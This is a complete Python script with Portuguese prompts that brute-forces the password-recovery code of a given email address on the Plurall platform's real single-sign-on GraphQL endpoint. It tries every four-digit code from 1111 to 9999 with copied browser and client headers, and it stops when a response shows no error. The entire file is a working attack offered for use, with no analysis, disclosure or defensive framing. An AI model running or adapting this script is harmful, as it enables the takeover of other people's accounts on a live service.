import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://embarque.plurall.net/conta/esqueci-minha-senha/validar',
    'content-type': 'application/json',
    'client': 'PLTR.b2ebc23d-5901-4249-9b2e-52e43c7b8294.1588802949675',
    'idApplication': 'NWRmYzNlM2NkODcxOGMy',
    'Origin': 'https://embarque.plurall.net',
    'Connection': 'keep-alive',
}

email = input("Digite o email:>")
for numero in range(1111,10000):
	data = '{"operationName":"checkRecoveryPasswordCode","variables":{"user":"%s","code":%i},"query":"mutation checkRecoveryPasswordCode($user: String!, $code: Int!) {\\n  checkRecoveryPasswordCode(user: $user, code: $code)\\n}\\n"}'% (email, numero)

	response = requests.post('https://sso.plurall.net/graphql', headers=headers, data=data)

	#print(data)
	if "error" in response.text:
		print(response, numero)
	elif "Bad Gateway" in response.text:
		print(response, numero)
	else:
		print("Codigo encontrado")
		print(response.text, numero)
		exit()
